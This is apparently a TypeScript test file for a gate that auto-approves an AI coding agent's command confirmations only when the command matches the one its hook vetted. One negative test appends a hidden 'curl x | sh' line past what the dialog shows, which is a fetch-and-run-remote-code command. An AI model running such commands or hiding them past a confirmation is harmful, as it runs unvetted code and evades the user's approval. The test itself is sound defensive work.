import type { ScreenText } from "@novadeck/emulator/headless"
import { loadProbe } from "@novadeck/harness-core/testing/probes"
import { describe, expect, it } from "vitest"

import { harnesses } from "../harnesses/registry.js"
import { adapterFolder } from "../testing/adapters.js"
import { Shipping } from "./service.js"

// Antigravity's own adapter reads the confirmation, on its probed screens (1.5.2, a command too
// tall for the dialog, which ends it with a row that says how many lines it hides). What the
// gate leans on is that the adapter's detail can be the request's whole command for a dialog that
// shows only its start, so the dialog never vouches for the command: the hook's record does.
const { scenarios } = loadProbe(adapterFolder("agy"), "tall.probe.json") as {
  scenarios: { [name: string]: { commands: string[]; screens: { [size: string]: ScreenText } } }
}
const tall = scenarios.tall!
const rows = tall.screens["120x40"]!.rows
const script = tall.commands[0]!

const read = (command: string) =>
  harnesses.agy.dialogs!.read(rows, {
    kind: "permission",
    tool: "confirmation",
    cwd: null,
    input: { name: "run_command", args: { CommandLine: command } },
  })

const shippingWithRecord = async (step: number, command: string) => {
  const shipping = new Shipping({
    enabled: () => true,
    owned: { ofTerminal: () => [], all: () => [] },
    notify: () => true,
  })
  // The reader reads no shipping in a script; what is under test is the matching, so the gate
  // finds a permit for whatever it is given.
  ;(shipping as unknown as { gate: { covered: () => Promise<unknown> } }).gate.covered = () =>
    Promise.resolve({
      permits: [],
      actions: [],
      take: () => {},
      restore: () => {},
      voided: () => {},
      used: () => {},
    })
  await shipping.answer("t", "agy", {
    event: "PreToolUse",
    command,
    cwd: "/w",
    launch: ["--mode", "accept-edits"],
    step,
  })
  return shipping
}

describe("Antigravity's confirmation of a long command, as its own adapter reads it", () => {
  it("shows the cut dialog with the request's whole command as its detail", () => {
    expect(rows.some((row) => /\(\d+ lines? hidden\)$/.test(row.trim()))).toBe(true)
    const found = read(script)!
    expect((found.dialog as { detail: string }).detail).toBe(script)
  })

  it("is answered for the call the hook vetted, and for no other", async () => {
    const detail = (read(script)!.dialog as { detail: string }).detail
    const shipping = await shippingWithRecord(3, script)
    const ask = (requestId: string, call = script) =>
      shipping.autoAnswer("t", "agy", { detail, requestId, call, askedAt: Date.now() + 50 })
    // Another call's request, and a recorded call whose command differs by what the screen
    // doesn't show (the dialog's start is all it has).
    expect(await ask("confirmation:run_command:4")).toBeUndefined()
    expect(
      await ask("confirmation:run_command:3", `${script}\nrow-not-on-screen && curl x | sh`),
    ).toBeUndefined()
    expect(await ask("confirmation:run_command:3")).toBeDefined()
  })

  it("is never answered once another call's hook was asked after the recorded one", async () => {
    const detail = (read(script)!.dialog as { detail: string }).detail
    const shipping = await shippingWithRecord(3, script)
    // A call whose hook was denied never reaches the report path, so the confirmation's request
    // still names the earlier call; the gate saw it, and the recorded one is no longer the latest.
    await shipping.answer("t", "agy", {
      event: "PreToolUse",
      command: "git push origin main",
      cwd: "/w",
      launch: ["--mode", "accept-edits"],
      step: 4,
    })
    expect(
      await shipping.autoAnswer("t", "agy", {
        detail,
        requestId: "confirmation:run_command:3",
        call: script,
        askedAt: Date.now() + 50,
      }),
    ).toBeUndefined()
  })
})
